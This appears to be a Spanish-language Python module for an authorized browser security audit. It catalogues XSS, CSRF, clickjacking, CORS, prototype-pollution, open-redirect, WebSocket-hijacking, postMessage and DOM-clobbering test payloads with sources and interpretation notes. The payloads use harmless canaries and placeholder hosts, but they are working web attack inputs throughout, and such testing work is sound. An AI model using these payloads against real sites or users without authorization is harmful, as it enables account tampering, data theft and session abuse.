"""Pruebas de navegador contrastadas con PortSwigger, OWASP y PayloadsAllTheThings.

Cada entrada: nombre, objetivo, lenguaje, código adaptable, interpretación y fuente.
Los marcadores representan únicamente activos y cuentas controlados por el auditor.
"""

PS_XSS = 'https://portswigger.net/web-security/cross-site-scripting/contexts'
PS_DOM_XSS = 'https://portswigger.net/web-security/cross-site-scripting/dom-based'
PS_CSRF = 'https://portswigger.net/web-security/csrf/bypassing-token-validation'
PS_SAMESITE = 'https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions'
PATT_CSRF = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Cross-Site%20Request%20Forgery/README.md'
PS_CLICK = 'https://portswigger.net/web-security/clickjacking'
PATT_CLICK = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Clickjacking/README.md'
PS_CORS = 'https://portswigger.net/web-security/cors'
PS_CORS_SPEC = 'https://portswigger.net/web-security/cors/access-control-allow-origin'
PS_PROTO = 'https://portswigger.net/web-security/prototype-pollution/client-side'
PATT_PROTO = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prototype%20Pollution/README.md'
OWASP_REDIRECT = 'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'
PATT_REDIRECT = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md'
PS_WS = 'https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking'
PATT_WS = 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/README.md'
PS_MESSAGE = 'https://portswigger.net/web-security/dom-based/controlling-the-web-message-source'
PS_CLOBBER = 'https://portswigger.net/web-security/dom-based/dom-clobbering'

AMPLIACIONES = {
    'xss': [
        ('HTML entre etiquetas', 'Usar solo cuando el valor cae como texto HTML sin escape.', 'html',
         r'''<img src=x onerror="document.body.dataset.xss='prueba-123'">''',
         'Confirmar que aparece el atributo en el DOM de la página; un reflejo textual o un recurso roto no confirma ejecución.', PS_XSS),
        ('Atributo entre comillas dobles', 'Cerrar un atributo HTML vulnerable y crear un handler de prueba.', 'html',
         r'''" autofocus onfocus="document.body.dataset.xss='prueba-123'" x="''',
         'Solo aplica a un atributo entre comillas. Comprobar el elemento final y si el foco realmente dispara el handler.', PS_XSS),
        ('URL de href', 'Verificar un sink URL que acepte javascript: en un enlace propio.', 'html',
         r'''javascript:document.body.dataset.xss='prueba-123' ''',
         'Exige clic del auditor; comparar URL resuelta y política CSP. No equivale a ejecución automática.', PS_XSS),
        ('Cierre de script', 'Aplicar si el dato está dentro de un elemento script y se parsea primero como HTML.', 'html',
         r'''</script><img src=x onerror="document.body.dataset.xss='prueba-123'">''',
         'Verificar que se creó un nuevo elemento y ejecutó el handler; no usarlo si el contexto es JSON separado.', PS_XSS),
        ('Cadena JavaScript', 'Salir de una cadena con comillas simples y reparar la sintaxis posterior.', 'js',
         r"""';document.body.dataset.xss='prueba-123';//""",
         'Adaptar a comilla y contexto exactos; un SyntaxError sin ejecución no confirma XSS.', PS_XSS),
        ('Template literal', 'Usar cuando la entrada cae dentro de backticks en JavaScript.', 'js',
         r'''${document.body.dataset.xss='prueba-123'}''',
         'La expresión se evalúa dentro del template literal; confirmar en DOM y evitar inferirlo del reflejo.', PS_XSS),
        ('Fragmento DOM', 'Usar si la SPA copia location.hash a innerHTML u otro sink HTML.', 'text',
         r'''#<img src=x onerror="document.body.dataset.xss='prueba-123'">''',
         'Abrir la URL con fragmento en una sesión de prueba; comprobar fuente y sink en DevTools.', PS_DOM_XSS),
        ('Contenido almacenado', 'Enviar el canary a un campo propio que se renderice en otra vista.', 'json',
         r'''{"comment":"<img src=x onerror=\"document.body.dataset.xss='prueba-123'\">"}''',
         'Recargar con una segunda cuenta controlada; confirmar persistencia y ejecución sin exponer a usuarios reales.', PS_XSS),
        ('SVG con onload', 'Probar un contexto que permite SVG inline, no una imagen SVG aislada.', 'html',
         r'''<svg onload="document.body.dataset.xss='prueba-123'"></svg>''',
         'El handler debe ejecutarse bajo el origen objetivo; políticas CSP pueden bloquearlo.', PS_XSS),
        ('Atributo sin comillas', 'Probar un sink HTML cuyo valor de atributo no está delimitado.', 'html',
         r'''x onpointerenter=document.body.dataset.xss='prueba-123' x''',
         'Requiere interacción del puntero y que el parser genere un atributo nuevo; inspeccionar DOM final.', PS_XSS),
        ('Entidad HTML en handler', 'Probar decodificación de entidad antes de evaluar JavaScript en un atributo de evento.', 'html',
         r'''&apos;;document.body.dataset.xss='prueba-123';//''',
         'Solo aplica a una cadena JS dentro de un atributo HTML como onclick; el navegador decodifica la entidad antes del parser JS.', PS_XSS),
        ('Backslash antes de comilla', 'Comprobar escape incompleto de backslash en una cadena JavaScript.', 'js',
         r"""\';document.body.dataset.xss='prueba-123';//""",
         'El servidor debe escapar comillas pero no barras inversas para que la barra aportada neutralice su escape; verificar código final.', PS_XSS),
    ],
    'csrf': [
        ('Formulario POST cruzado', 'Reproducir una acción reversible de la cuenta propia desde otro origen.', 'html',
         r'''<form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>''',
         'Confirmar cambio desde la cuenta de prueba y restaurarlo. La cookie debe viajar; curl no prueba esta condición.', PATT_CSRF),
        ('Acción GET', 'Detectar cambio de estado en GET sin token.', 'html',
         r'''<img src="https://{ORIGEN}/api/profile/set-name?value=prueba-123">''',
         'Requiere endpoint con efecto GET y cookie enviada por el navegador; verificar estado final propio.', PS_CSRF),
        ('Token omitido', 'Comparar la misma acción con el parámetro CSRF completamente ausente.', 'http',
         r'''POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
Content-Type: application/x-www-form-urlencoded

displayName=prueba-123''',
         'Distinguir ausencia del campo de token vacío; el efecto debe comprobarse en backend.', PS_CSRF),
        ('Validación solo en POST', 'Probar si la ruta equivalente acepta GET sin token.', 'http',
         r'''GET /api/profile?displayName=prueba-123 HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}''',
         'Un 200 sin modificación no basta. Solo aplica si el método alternativo realmente ejecuta la acción.', PS_CSRF),
        ('Token de otra sesión propia', 'Comprobar si un token emitido para A se acepta con sesión B.', 'http',
         r'''POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_B}
Content-Type: application/x-www-form-urlencoded

csrf={CSRF_DE_A}&displayName=prueba-123''',
         'Usar dos cuentas controladas; si cambia B, el token no está vinculado correctamente a la sesión.', PS_CSRF),
        ('Double-submit sin firma', 'Comparar cookie y parámetro controlados con el mismo valor de prueba.', 'http',
         r'''POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}; csrf=prueba-123
Content-Type: application/x-www-form-urlencoded

csrf=prueba-123&displayName=prueba-123''',
         'Aceptar valores inventados indica validación débil, pero la explotación entre orígenes exige demostrar que puede fijarse la cookie.', PS_CSRF),
        ('POST text/plain', 'Verificar si la API procesa cuerpo de formulario simple como JSON; probar solo en cuenta propia.', 'html',
         r'''<form action="https://{ORIGEN}/api/profile" method="POST" enctype="text/plain"><input name='{"displayName":"prueba-123","x":"' value='"}'></form><script>document.forms[0].submit()</script>''',
         'La sintaxis final depende del parser; inspeccionar request real y efecto, no inferir por la ausencia de preflight.', PATT_CSRF),
        ('SameSite Lax y navegación superior', 'Comprobar una acción GET que se ejecuta al navegar directamente desde otro sitio.', 'html',
         r'''<a href="https://{ORIGEN}/api/profile/set-name?value=prueba-123">Abrir prueba</a>''',
         'La cookie Lax puede viajar en navegación GET superior; registrar comportamiento del navegador y efecto real.', PS_SAMESITE),
        ('Token vacío', 'Distinguir validación de token presente pero sin valor frente a token ausente.', 'http',
         r'''POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
Content-Type: application/x-www-form-urlencoded

csrf=&displayName=prueba-123''',
         'Comparar contra token válido, inválido y omitido. Una aceptación puede revelar una rama de validación defectuosa.', PS_CSRF),
        ('Referer suprimido', 'Probar una defensa que solo verifica Referer cuando existe.', 'html',
         r'''<meta name="referrer" content="no-referrer"><form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>''',
         'Confirmar que el navegador omitió Referer y que la acción propia se efectuó; algunas apps también validan Origin.', 'https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses'),
        ('Subdominio same-site', 'Comprobar un origen de prueba bajo el mismo site pero distinto origin.', 'html',
         r'''<!-- Hospedar en https://{SUBDOMINIO_CONTROLADO}.{ORIGEN} --><form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>''',
         'SameSite puede enviar la cookie porque es same-site; aún debe fallar una defensa CSRF ligada a sesión u Origin.', PS_SAMESITE),
    ],
    'clickjacking': [
        ('Framing básico', 'Comprobar si una página de acción sensible permite iframe desde origen de prueba.', 'html',
         r'''<iframe src="https://{ORIGEN}/account/settings" width="1000" height="700"></iframe>''',
         'Framing permitido es precondición; demostrar además una acción sensible reversible.', PS_CLICK),
        ('Superposición de un clic', 'Alinear un botón señuelo y una acción real en laboratorio.', 'html',
         r'''<style>iframe{position:absolute;top:0;left:0;width:1000px;height:700px;opacity:.05;z-index:2}button{position:absolute;top:{Y}px;left:{X}px;z-index:1}</style><button>Ver prueba</button><iframe src="https://{ORIGEN}/account/settings"></iframe>''',
         'Sustituir coordenadas por medidas de la vista propia; un clic debe accionar solo el control autorizado.', PS_CLICK),
        ('Formulario prellenado', 'Probar si la URL puede preparar valores antes del clic.', 'html',
         r'''<iframe src="https://{ORIGEN}/account/settings?displayName=prueba-123" width="1000" height="700"></iframe>''',
         'La pre-carga y el clic final deben verificarse; un query ignorado no crea impacto.', PS_CLICK),
        ('Dos pasos', 'Alinear dos posiciones cuando el flujo requiere confirmación adicional.', 'html',
         r'''<button style="position:absolute;left:{X1}px;top:{Y1}px">Paso 1</button><button style="position:absolute;left:{X2}px;top:{Y2}px">Paso 2</button><iframe style="position:absolute;left:0;top:0;opacity:.05;z-index:2" src="https://{ORIGEN}/account/settings"></iframe>''',
         'Ambos clics se reproducen solo en la cuenta de prueba; medir desplazamientos tras el primero.', PS_CLICK),
        ('Cabeceras de la ruta', 'Verificar políticas efectivas en la página embebida.', 'bash',
         r'''curl -sSI "https://{ORIGEN}/account/settings" | rg -i 'content-security-policy|x-frame-options' ''',
         'La ausencia de headers no es hallazgo sin framing y acción; la respuesta HEAD puede diferir de GET.', PS_CLICK),
        ('Protección por CSP en iframe', 'Comparar desde un origen permitido y uno externo controlado.', 'html',
         r'''<iframe src="https://{ORIGEN}/account/settings" onload="console.log('frame cargado')"></iframe>''',
         'onload por sí solo no prueba que se haya renderizado el documento; comprobar consola del navegador por frame-ancestors.', PS_CLICK),
        ('Frame buster bajo sandbox', 'Probar si un frame buster de JavaScript falla al impedir la navegación superior.', 'html',
         r'''<iframe src="https://{ORIGEN}/account/settings" sandbox="allow-forms" width="1000" height="700"></iframe>''',
         'Solo aplica si la ruta es frameable y la acción funciona con scripts deshabilitados; comprobar el clic en cuenta propia.', PS_CLICK),
        ('Click sobre enlace DOM', 'Combinar una página frameable con un sink DOM que crea un enlace controlado.', 'html',
         r'''<button style="position:absolute;left:{X}px;top:{Y}px">Abrir prueba</button><iframe style="position:absolute;left:0;top:0;opacity:.05;z-index:2;width:1000px;height:700px" src="https://{ORIGEN}/page#%3Ca%20href%3D%22javascript%3Adocument.body.dataset.xss%3D123%22%3Eabrir%3C%2Fa%3E"></iframe>''',
         'Solo aplica si la página convierte el fragmento en un enlace HTML clicable; medir su posición y confirmar el efecto en cuenta propia.', PS_CLICK),
    ],
    'cors': [
        ('Reflejo de Origin arbitrario', 'Comparar ACAO con un origen propio que no está permitido.', 'bash',
         r'''curl -si -H "Origin: https://{CONTROLLED_HOST}" "https://{ORIGEN}/api/me"''',
         'Si ACAO refleja el origen, comprobar también ACAC, cookies y datos privados desde navegador.', PS_CORS),
        ('Origin null', 'Comprobar si un origen opaco se acepta en el endpoint privado.', 'bash',
         r'''curl -si -H "Origin: null" "https://{ORIGEN}/api/me"''',
         'ACAO: null por sí solo es insuficiente; crear un contexto opaco de laboratorio y verificar lectura real.', PS_CORS),
        ('Sufijo de dominio no anclado', 'Probar un dominio controlado que contiene el nombre permitido como prefijo.', 'bash',
         r'''curl -si -H "Origin: https://{ORIGEN}.{CONTROLLED_HOST}" "https://{ORIGEN}/api/me"''',
         'Solo es bypass si la allowlist refleja exactamente ese origen y un navegador lee datos de prueba.', PS_CORS),
        ('Prefijo de dominio no anclado', 'Probar una comparación de texto que admite un prefijo aparentemente confiable.', 'bash',
         r'''curl -si -H "Origin: https://{SUBDOMINIO_PERMITIDO}-{CONTROLLED_HOST}" "https://{ORIGEN}/api/me"''',
         'La eficacia depende de la regex o parser del servidor. Sustituir por un host efectivamente propio.', PS_CORS),
        ('Preflight de método/cabecera', 'Inspeccionar autorización de una solicitud no simple.', 'http',
         r'''OPTIONS /api/me HTTP/1.1\nHost: {ORIGEN}\nOrigin: https://{CONTROLLED_HOST}\nAccess-Control-Request-Method: GET\nAccess-Control-Request-Headers: X-Prueba''',
         'Revisar ACAO, ACAM, ACAH y ACAC; un preflight permisivo no confirma respuesta privada legible.', PS_CORS_SPEC),
        ('Lectura con credenciales en navegador', 'Confirmar desde el origen controlado y cuenta propia.', 'js',
         r'''fetch("https://{ORIGEN}/api/me", {credentials:"include"}).then(r=>r.text()).then(t=>console.log(t.length)).catch(console.error)''',
         'Registrar solo longitud o marcador propio; la cookie debe viajar según SameSite y la respuesta debe contener datos privados.', PS_CORS),
        ('Wildcard y credenciales', 'Descartar la interpretación errónea de ACAO: * más ACAC true.', 'bash',
         r'''curl -si -H "Origin: https://{CONTROLLED_HOST}" "https://{ORIGEN}/api/me" | rg -i 'access-control-allow-(origin|credentials)' ''',
         'El navegador no concede lectura con credenciales si ACAO es *; no reportarlo como fuga sin PoC en navegador.', PS_CORS_SPEC),
        ('Vary: Origin', 'Comparar respuestas de dos orígenes propios en una URL única cacheable.', 'bash',
         r'''curl -si -H "Origin: https://{CONTROLLED_HOST_A}" "https://{ORIGEN}/api/prueba?cb=123"\ncurl -si -H "Origin: https://{CONTROLLED_HOST_B}" "https://{ORIGEN}/api/prueba?cb=123"''',
         'Si hay caché compartida, comprobar ACAO entregado al segundo origen; no inferir poisoning sin evidencia de caché.', PS_CORS),
        ('Origen null desde sandbox', 'Confirmar la cabecera null con una página opaca real.', 'html',
         r'''<script>addEventListener('message',e=>console.log(e.data))</script><iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://{ORIGEN}/api/me',{credentials:'include'}).then(r=>r.text()).then(x=>parent.postMessage(x.length,'*')).catch(console.error)</script>"></iframe>''',
         'El iframe sandbox produce Origin null; observar lectura solo sobre sesión propia. La política de cookies puede bloquearla.', PS_CORS),
        ('Subdominio HTTP confiado', 'Comprobar allowlist que acepta un origen sin TLS.', 'bash',
         r'''curl -si -H "Origin: http://{SUBDOMINIO_PERMITIDO}.{ORIGEN}" "https://{ORIGEN}/api/me"''',
         'La cabecera sola no demuestra impacto; hace falta un subdominio controlable y lectura desde navegador.', PS_CORS),
        ('Origen confiado con XSS', 'Probar cadena CORS con XSS ya validado en un origen autorizado.', 'js',
         r'''fetch('https://{ORIGEN}/api/me',{credentials:'include'}).then(r=>r.text()).then(x=>console.log(x.length))''',
         'Ejecutar exclusivamente desde la página de prueba del subdominio autorizado; demostrar tanto XSS como lectura.', PS_CORS),
    ],
    'prototype-pollution': [
        ('Query con corchetes', 'Probar una fuente de URL que convierte parámetros anidados en objetos.', 'text',
         r'''https://{ORIGEN}/?__proto__[marcaPrueba]=prueba-123''',
         'En DevTools observar Object.prototype.marcaPrueba; un parámetro reflejado no implica contaminación.', PS_PROTO),
        ('Query con puntos', 'Distinguir parser que acepta notación de puntos.', 'text',
         r'''https://{ORIGEN}/?__proto__.marcaPrueba=prueba-123''',
         'Probar en página propia y recargar entre variantes para limpiar el contexto de JavaScript.', PS_PROTO),
        ('Fragmento de URL', 'Verificar si la SPA parsea y fusiona location.hash.', 'text',
         r'''https://{ORIGEN}/#__proto__[marcaPrueba]=prueba-123''',
         'El fragmento no llega al servidor; requiere código cliente que lo procese y haga merge.', PS_PROTO),
        ('Entrada JSON', 'Comprobar merge profundo de JSON controlado.', 'json',
         r'''{"__proto__":{"marcaPrueba":"prueba-123"}}''',
         'JSON.parse conserva la clave; solo el merge inseguro la lleva al prototipo. Verificar en la misma página.', PS_PROTO),
        ('constructor.prototype', 'Probar ruta alternativa cuando __proto__ se filtra.', 'json',
         r'''{"constructor":{"prototype":{"marcaPrueba":"prueba-123"}}}''',
         'Confirmar que un objeto nuevo hereda la marca; un eco del JSON no es prueba.', PS_PROTO),
        ('Filtro no recursivo', 'Probar el patrón documentado de eliminación única de __proto__.', 'text',
         r'''https://{ORIGEN}/?__pro__proto__to__.marcaPrueba=prueba-123''',
         'Solo aplica si se observó una sanitización por replace no recursiva; comparar antes/después.', PS_PROTO),
        ('Propiedad y gadget de prueba', 'Comprobar si una propiedad heredada llega a un sink sin usar código activo.', 'text',
         r'''https://{ORIGEN}/?__proto__[transport_url]=https%3A%2F%2F{CONTROLLED_HOST}%2Fpp-123''',
         'Una solicitud al host controlado demuestra gadget solo si el código del sitio usa esa propiedad; no asumir XSS.', PATT_PROTO),
        ('Lectura de control', 'Verificar contaminación local y limpiar el estado recargando.', 'js',
         r'''({}).marcaPrueba === 'prueba-123' ? 'contaminado' : 'sin evidencia' ''',
         'La propiedad heredada es una primitive; un reporte de impacto requiere gadget y sink comprobados.', PS_PROTO),
        ('Query anidada bajo opciones', 'Probar parser que convierte una estructura options anidada.', 'text',
         r'''https://{ORIGEN}/?options[__proto__][marcaPrueba]=prueba-123''',
         'Solo hay contaminación si options llega a un merge profundo; comprobar Object.prototype en ese contexto.', PS_PROTO),
        ('Constructor por corchetes', 'Probar alternativa de notación al filtro que bloquea constructor.prototype literal.', 'text',
         r'''https://{ORIGEN}/?constructor[prototype][marcaPrueba]=prueba-123''',
         'Comparar con dot notation y confirmar herencia; no inferir de la URL aceptada.', PS_PROTO),
        ('Mensaje JSON a fuente de merge', 'Probar si el receptor fusiona event.data sin filtrar claves.', 'js',
         r'''destino.contentWindow.postMessage(JSON.parse('{"__proto__":{"marcaPrueba":"prueba-123"}}'),'https://{ORIGEN}')''',
         'Requiere un handler de mensajes que haga merge de datos; verificar marca en la ventana receptora.', PS_PROTO),
    ],
    'open-redirect': [
        ('URL absoluta', 'Confirmar si next acepta URL externa propia.', 'http',
         r'''GET /redirect?next=https%3A%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1\nHost: {ORIGEN}''',
         'Confirmar Location o navegación hacia el host controlado; un 200 con texto no es redirect.', OWASP_REDIRECT),
        ('URL relativa a protocolo', 'Probar un destino // que hereda el esquema.', 'http',
         r'''GET /redirect?next=%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1\nHost: {ORIGEN}''',
         'Verificar Location y destino final en navegador; algunos frameworks convierten a ruta local.', PATT_REDIRECT),
        ('Userinfo con @', 'Distinguir host real de texto antes de @.', 'text',
         r'''https://{HOST_PERMITIDO}@{CONTROLLED_HOST}/prueba''',
         'El host efectivo es el situado después de @; usar solo si la validación parece comparar texto de URL.', PATT_REDIRECT),
        ('Sufijo de allowlist', 'Probar coincidencia por prefijo sin límite de host.', 'text',
         r'''https://{HOST_PERMITIDO}.{CONTROLLED_HOST}/prueba''',
         'Solo funciona si el host resultante es del auditor y el validador acepta una comparación incompleta.', PATT_REDIRECT),
        ('Parámetro duplicado', 'Detectar si validador y consumidor eligen valores distintos.', 'http',
         r'''GET /redirect?next=%2Fcuenta&next=https%3A%2F%2F{CONTROLLED_HOST}%2Fprueba HTTP/1.1\nHost: {ORIGEN}''',
         'Comparar también cada parámetro solo; no concluir bypass por diferencias de parser sin redirección externa.', PATT_REDIRECT),
        ('Ruta de redirección', 'Probar aplicaciones que incorporan el destino en la ruta.', 'http',
         r'''GET /redirect/https://{CONTROLLED_HOST}/prueba HTTP/1.1\nHost: {ORIGEN}''',
         'Verificar si el router captura la URL completa y genera Location externo.', PATT_REDIRECT),
        ('Codificación doble', 'Identificar un segundo decode después de validar.', 'http',
         r'''GET /redirect?next=https%253A%252F%252F{CONTROLLED_HOST}%252Fprueba HTTP/1.1\nHost: {ORIGEN}''',
         'La respuesta debe mostrar destino externo tras dos capas; una cadena codificada sin navegación no confirma.', PATT_REDIRECT),
        ('Redirección DOM', 'Observar si JavaScript cliente asigna location desde un fragmento.', 'text',
         r'''https://{ORIGEN}/redirect#https://{CONTROLLED_HOST}/prueba''',
         'Solo aplica si el script lee location.hash y navega; documentar la línea de código o el efecto.', PATT_REDIRECT),
    ],
    'websocket-hijacking': [
        ('Handshake legítimo de control', 'Registrar el Upgrade normal de una cuenta propia.', 'http',
         r'''GET /ws HTTP/1.1\nHost: {ORIGEN}\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nOrigin: https://{ORIGEN}\nCookie: session={COOKIE_PROPIA}''',
         'El 101 demuestra upgrade, pero no datos accesibles ni fallo de Origin.', PS_WS),
        ('Origin externo en handshake', 'Comparar el mismo canal con origen externo controlado.', 'http',
         r'''GET /ws HTTP/1.1\nHost: {ORIGEN}\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nOrigin: https://{CONTROLLED_HOST}\nCookie: session={COOKIE_PROPIA}''',
         'Un cliente HTTP puede falsificar Origin; confirmar desde navegador que la cookie se envía y hay mensajes privados.', PS_WS),
        ('Conexión cruzada real', 'Abrir WebSocket desde una página propia fuera del origen objetivo.', 'js',
         r'''const ws=new WebSocket('wss://{ORIGEN}/ws'); ws.onopen=()=>console.log('abierto'); ws.onmessage=e=>console.log('mensaje',e.data.length);''',
         'El navegador fija Origin y aplica cookies; observar solo metadatos de mensajes de la cuenta de prueba.', PS_WS),
        ('Handshake sin cookie', 'Distinguir canal público de canal autenticado.', 'http',
         r'''GET /ws HTTP/1.1\nHost: {ORIGEN}\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nOrigin: https://{CONTROLLED_HOST}''',
         'Comparar con sesión propia; un 101 público sin mensajes sensibles no confirma CSWSH.', PS_WS),
        ('Token de handshake omitido', 'Verificar si el canal depende solo de cookie.', 'text',
         r'''wss://{ORIGEN}/ws?csrf=      -> comparar con wss://{ORIGEN}/ws?csrf={TOKEN_PROPIO}''',
         'Si un token impredecible es obligatorio, una página externa normalmente no podrá iniciar el canal autenticado.', PS_WS),
        ('Mensaje de consulta propio', 'Comprobar qué datos permite leer el canal cruzado.', 'js',
         r'''ws.onopen=()=>ws.send(JSON.stringify({type:'history',objectId:'{ID_PROPIO}'})); ws.onmessage=e=>console.log(e.data.length);''',
         'Adaptar esquema al tráfico real. Solo un dato privado propio legible desde el origen externo demuestra impacto.', PS_WS),
        ('Mensaje hacia segundo objeto propio', 'Verificar autorización por objeto además de la del handshake.', 'json',
         r'''{"type":"history","objectId":"{ID_CONTROLADO_B}"}''',
         'Enviar con sesión A y objeto B, ambos controlados. Un fallo por objeto es distinto del CSWSH y debe separarse.', PATT_WS),
        ('Recepción pasiva de eventos', 'Comprobar si un canal cruzado revela notificaciones sin enviar mensajes.', 'js',
         r'''const ws=new WebSocket('wss://{ORIGEN}/ws'); ws.onmessage=e=>console.log('bytes',e.data.length);''',
         'Generar un evento inocuo desde otra cuenta propia; registrar solo longitud y marcador, no mensajes ajenos.', PS_WS),
    ],
    'postmessage': [
        ('Mensaje desde origen externo', 'Comprobar si un receptor procesa eventos sin validar Origin.', 'html',
         r'''<iframe id="destino" src="https://{ORIGEN}/widget"></iframe><script>const f=document.getElementById('destino');f.onload=()=>f.contentWindow.postMessage({type:'probe',value:'prueba-123'},'https://{ORIGEN}')</script>''',
         'Observar una acción concreta; el hecho de enviar un mensaje no implica que el receptor lo acepte.', PS_MESSAGE),
        ('Bypass de contains', 'Probar validador que usa indexOf/contains sobre event.origin.', 'text',
         r'''https://{SUBDOMINIO_PERMITIDO}.{CONTROLLED_HOST}''',
         'Hospedar el emisor en ese dominio propio y verificar que el receptor actúa; requiere observar comparación defectuosa.', PS_MESSAGE),
        ('Bypass de endsWith', 'Probar validador que acepta sufijo textual sin frontera DNS.', 'text',
         r'''https://{PREFIJO_CONTROLADO}{DOMINIO_PERMITIDO}''',
         'El host debe estar realmente bajo control del auditor; solo tiene sentido si el código usa endsWith sin delimitador.', PS_MESSAGE),
        ('Datos hacia HTML', 'Probar un sink innerHTML del receptor con canary inocuo.', 'js',
         r'''destino.contentWindow.postMessage('<img src=x onerror="document.body.dataset.msg=123">','https://{ORIGEN}')''',
         'Confirmar ejecución en el origen receptor; el mensaje puede ser rechazado por esquema o CSP.', PS_MESSAGE),
        ('Datos hacia eval', 'Probar solo si el código del receptor llama eval con event.data.', 'js',
         r'''destino.contentWindow.postMessage("document.body.dataset.msg='prueba-123'",'https://{ORIGEN}')''',
         'Un dato textual reflejado no basta; observar el sink y el efecto bajo la sesión de prueba.', PS_MESSAGE),
        ('Destino wildcard del emisor', 'Registrar si la app entrega datos privados a un popup no confiable.', 'js',
         r'''addEventListener('message', e => console.log(e.origin, typeof e.data, JSON.stringify(e.data).length));''',
         'Usar un flujo propio que abra la ventana controlada; no registrar contenido privado completo.', PS_MESSAGE),
        ('Confusión de ventana source', 'Enviar el mismo tipo de mensaje desde dos iframes de origen distinto.', 'js',
         r'''marcoA.contentWindow.postMessage({type:'probe',value:'A'},'https://{ORIGEN}'); marcoB.contentWindow.postMessage({type:'probe',value:'B'},'https://{ORIGEN}');''',
         'Comparar event.origin y event.source en el receptor; se requiere que la aplicación confíe en la ventana incorrecta.', PS_MESSAGE),
        ('URL recibida', 'Comprobar navegación inducida por un mensaje no confiable.', 'js',
         r'''destino.contentWindow.postMessage({type:'navigate',url:'https://{CONTROLLED_HOST}/prueba'},'https://{ORIGEN}')''',
         'Adaptar el tipo al handler observado. Un cambio de Location confirma el sink; valorar open redirect por separado.', PS_MESSAGE),
    ],
    'dom-clobbering': [
        ('ID como global implícito', 'Comprobar si un nodo propio se expone como window.configPrueba.', 'html',
         r'''<a id="configPrueba" href="#prueba-123">marcador</a>''',
         'Observar typeof window.configPrueba; solo hay hallazgo si el JavaScript del sitio lo usa como configuración.', PS_CLOBBER),
        ('name como global', 'Probar exposición mediante name en un elemento permitido.', 'html',
         r'''<form name="configPrueba"><input value="prueba-123"></form>''',
         'Verificar si window.configPrueba resuelve al formulario y si interfiere con un global esperado.', PS_CLOBBER),
        ('Colección de anchors', 'Sobrescribir una propiedad de objeto mediante dos elementos con el mismo id.', 'html',
         r'''<a id="someObject"></a><a id="someObject" name="url" href="https://{CONTROLLED_HOST}/marcador.js"></a>''',
         'Este patrón requiere código que use someObject.url como fuente de script o recurso; una colección DOM sola no basta.', PS_CLOBBER),
        ('Método submit sombreado', 'Comprobar si un input homónimo cambia la propiedad form.submit.', 'html',
         r'''<form id="formPrueba"><input name="submit" value="prueba-123"></form>''',
         'En DevTools, typeof formPrueba.submit puede dejar de ser function; el impacto depende de un uso real del método.', PS_CLOBBER),
        ('Atributo de sanitizador sombreado', 'Reproducir en laboratorio el patrón documentado de properties clobbered.', 'html',
         r'''<form onclick="document.body.dataset.clobber=123"><input id="attributes">Prueba</form>''',
         'Solo aplica a un sanitizador cliente que itera element.attributes sin validar el tipo; confirmar ejecución controlada.', PS_CLOBBER),
        ('Propiedad action de formulario', 'Medir colisión con propiedad de un formulario antes de buscar un gadget.', 'html',
         r'''<form id="formPrueba" action="/seguro"><input name="action" value="prueba-123"></form>''',
         'Comparar formPrueba.action con el atributo action; no inferir redirección ni exfiltración sin un uso posterior.', PS_CLOBBER),
        ('Tres niveles con form', 'Comprobar la cadena de propiedades HTMLCollection.form.input en Chrome.', 'html',
         r'''<form id="configPrueba" name="ruta"><input id="marcaPrueba" value="prueba-123"></form><form id="configPrueba"></form>''',
         'En Chrome, inspeccionar window.configPrueba.ruta.marcaPrueba.value. Otros navegadores pueden resolver distinto; requiere un gadget que use la cadena.', 'https://portswigger.net/research/dom-clobbering-strikes-back'),
    ],
}

# Los registros HTTP de varias líneas se escriben de forma compacta en este módulo.
# El generador recibe saltos de línea reales para que Burp Repeater pueda copiarlos.
for _slug, _pruebas in AMPLIACIONES.items():
    AMPLIACIONES[_slug] = [
        (_nombre, _objetivo, _lenguaje, _codigo.replace('\\n', '\n'), _interpretacion, _fuente)
        for _nombre, _objetivo, _lenguaje, _codigo, _interpretacion, _fuente in _pruebas
    ]
